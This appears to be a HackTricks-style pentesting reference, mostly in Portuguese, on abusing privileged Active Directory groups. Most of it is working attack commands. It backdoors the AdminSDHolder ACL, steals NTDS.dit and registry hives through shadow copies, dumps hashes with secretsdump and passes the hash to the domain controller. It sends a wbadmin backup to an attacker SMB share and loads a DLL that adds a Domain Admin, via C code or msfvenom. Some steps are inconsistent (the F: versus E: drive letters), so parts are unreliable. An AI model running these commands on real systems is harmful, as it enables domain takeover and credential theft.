# Grupos Privilegiados

{{#include ../../banners/hacktricks-training.md}}

## Grupos bem conhecidos com privilégios de administração

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

Este grupo está autorizado a criar contas e grupos que não são administradores no domínio. Além disso, permite o login local no Controlador de Domínio (DC).

Para identificar os membros deste grupo, o seguinte comando é executado:
```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
A criação de novos usuários é permitida, assim como o login local no DC.

## Grupo AdminSDHolder

A Lista de Controle de Acesso (ACL) do grupo **AdminSDHolder** é crucial, pois define permissões para todos os "protected groups" dentro do Active Directory, incluindo grupos de alto privilégio. Esse mecanismo assegura a segurança desses grupos ao impedir modificações não autorizadas.

Um atacante poderia explorar isso modificando a ACL do grupo **AdminSDHolder**, concedendo permissões totais a um usuário padrão. Isso daria efetivamente a esse usuário controle total sobre todos os grupos protegidos. Se as permissões desse usuário forem alteradas ou removidas, elas seriam automaticamente restabelecidas dentro de uma hora devido ao design do sistema.

Comandos para revisar os membros e modificar permissões incluem:
```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```
Um script está disponível para acelerar o processo de restauração: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Para mais detalhes, visite [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).

## AD Recycle Bin

A associação a este grupo permite a leitura de objetos do Active Directory excluídos, o que pode revelar informações sensíveis:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
### Acesso ao Domain Controller

O acesso a arquivos no DC é restrito, a menos que o usuário faça parte do grupo `Server Operators`, o que altera o nível de acesso.

### Escalada de Privilégios

Usando `PsService` ou `sc` do Sysinternals, é possível inspecionar e modificar permissões de serviços. O grupo `Server Operators`, por exemplo, tem controle total sobre certos serviços, permitindo a execução de comandos arbitrários e a escalada de privilégios:
```cmd
C:\> .\PsService.exe security AppReadiness
```
Este comando revela que `Server Operators` têm acesso total, permitindo a manipulação de serviços para elevação de privilégios.

## Backup Operators

A associação ao grupo `Backup Operators` fornece acesso ao sistema de arquivos `DC01` devido aos privilégios `SeBackup` e `SeRestore`. Esses privilégios permitem travessia de pastas, listagem e cópia de arquivos, mesmo sem permissões explícitas, usando a flag `FILE_FLAG_BACKUP_SEMANTICS`. É necessário utilizar scripts específicos para esse processo.

Para listar os membros do grupo, execute:
```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### Ataque Local

Para aproveitar esses privilégios localmente, os seguintes passos são empregados:

1. Importe as bibliotecas necessárias:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. Ative e verifique `SeBackupPrivilege`:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. Acessar e copiar arquivos de diretórios restritos, por exemplo:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### AD Attack

Acesso direto ao sistema de arquivos do Domain Controller permite o roubo do banco de dados `NTDS.dit`, que contém todos os hashes NTLM dos usuários e computadores do domínio.

#### Usando diskshadow.exe

1. Crie uma cópia sombra da unidade `C`:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. Copiar `NTDS.dit` da shadow copy:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
Alternativamente, use `robocopy` para copiar arquivos:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. Extrair `SYSTEM` e `SAM` para recuperação de hashes:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. Recuperar todos os hashes de `NTDS.dit`:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
5. Pós-extração: Pass-the-Hash para DA
```bash
# Use the recovered Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```
#### Usando wbadmin.exe

1. Configure um filesystem NTFS para o servidor SMB na máquina atacante e faça cache das credenciais SMB na máquina alvo.
2. Use `wbadmin.exe` para backup do sistema e extração do `NTDS.dit`:
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

For a practical demonstration, see [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

Membros do grupo **DnsAdmins** podem explorar seus privilégios para carregar uma DLL arbitrária com privilégios SYSTEM em um servidor DNS, frequentemente hospedado em controladores de domínio. Essa capacidade permite um potencial de exploração significativo.

Para listar os membros do grupo DnsAdmins, use:
```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### Executar DLL arbitrária (CVE‑2021‑40469)

> [!NOTE]
> Esta vulnerabilidade permite a execução de código arbitrário com privilégios SYSTEM no serviço DNS (geralmente dentro dos DCs). Este problema foi corrigido em 2021.

Membros podem fazer o servidor DNS carregar uma DLL arbitrária (localmente ou de um compartilhamento remoto) usando comandos como:
```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
Reiniciar o serviço DNS (o que pode exigir permissões adicionais) é necessário para que a DLL seja carregada:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
Para mais detalhes sobre este vetor de ataque, consulte ired.team.

#### Mimilib.dll

Também é possível usar mimilib.dll para execução de comandos, modificando-o para executar comandos específicos ou reverse shells. [Check this post](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) for more information.

### Registro WPAD para MitM

DnsAdmins pode manipular registros DNS para realizar ataques Man-in-the-Middle (MitM) criando um registro WPAD após desabilitar a global query block list. Ferramentas como Responder ou Inveigh podem ser usadas para spoofing e capturar tráfego de rede.

### Leitores de logs de eventos
Membros podem acessar logs de eventos, potencialmente encontrando informações sensíveis como senhas em texto claro ou detalhes de execução de comandos:
```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Exchange Windows Permissions

Este grupo pode modificar DACLs no objeto de domínio, potencialmente concedendo privilégios DCSync. Técnicas de escalonamento de privilégios que exploram esse grupo estão detalhadas no Exchange-AD-Privesc GitHub repo.
```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
## Hyper-V Administrators

Hyper-V Administrators têm acesso total ao Hyper-V, o que pode ser explorado para obter controle sobre Controladores de Domínio virtualizados. Isso inclui clonar DCs em execução e extrair NTLM hashes do arquivo NTDS.dit.

### Exploitation Example

O Mozilla Maintenance Service do Firefox pode ser explorado por Hyper-V Administrators para executar comandos como SYSTEM. Isso envolve criar um hard link para um arquivo SYSTEM protegido e substituí‑lo por um executável malicioso:
```bash
# Take ownership and start the service
takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
sc.exe start MozillaMaintenance
```
Nota: Hard link exploitation foi mitigada em atualizações recentes do Windows.

## Group Policy Creators Owners

Este grupo permite que os membros criem Group Policies no domínio. No entanto, seus membros não podem aplicar políticas de grupo a usuários ou grupos, nem editar GPOs existentes.

## Organization Management

Em ambientes onde o **Microsoft Exchange** está implantado, um grupo especial conhecido como **Organization Management** possui capacidades significativas. Esse grupo tem privilégio para **acessar as caixas de correio de todos os usuários do domínio** e mantém **controle total sobre a Unidade Organizacional (OU) 'Microsoft Exchange Security Groups'**. Esse controle inclui o grupo **`Exchange Windows Permissions`**, que pode ser explorado para escalada de privilégios.

### Privilege Exploitation and Commands

#### Print Operators

Membros do **Print Operators** possuem vários privilégios, incluindo o **`SeLoadDriverPrivilege`**, que lhes permite **log on locally to a Domain Controller**, desligá-lo e gerenciar impressoras. Para explorar esses privilégios, especialmente se **`SeLoadDriverPrivilege`** não for visível em um contexto não elevado, é necessário contornar o User Account Control (UAC).

Para listar os membros deste grupo, o seguinte comando PowerShell é usado:
```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
Para técnicas de exploração mais detalhadas relacionadas a **`SeLoadDriverPrivilege`**, deve-se consultar recursos de segurança específicos.

#### Usuários de Área de Trabalho Remota

Os membros deste grupo têm acesso a computadores via Remote Desktop Protocol (RDP). Para enumerar esses membros, estão disponíveis comandos PowerShell:
```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
Mais informações sobre exploração de RDP podem ser encontradas em recursos dedicados de pentesting.

#### Usuários de Gerenciamento Remoto

Os membros podem acessar computadores via **Windows Remote Management (WinRM)**. A enumeração desses membros é feita através de:
```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
Para técnicas de exploração relacionadas ao **WinRM**, deve-se consultar a documentação específica.

#### Operadores de Servidor

Este grupo tem permissões para realizar várias configurações em Controladores de Domínio, incluindo privilégios de backup e restauração, alteração da hora do sistema e desligamento do sistema. Para enumerar os membros, o comando fornecido é:
```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
## Referências <a href="#references" id="references"></a>

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)
- [https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--](https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://rastamouse.me/2019/01/gpo-abuse-part-1/](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
- [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)


{{#include ../../banners/hacktricks-training.md}}
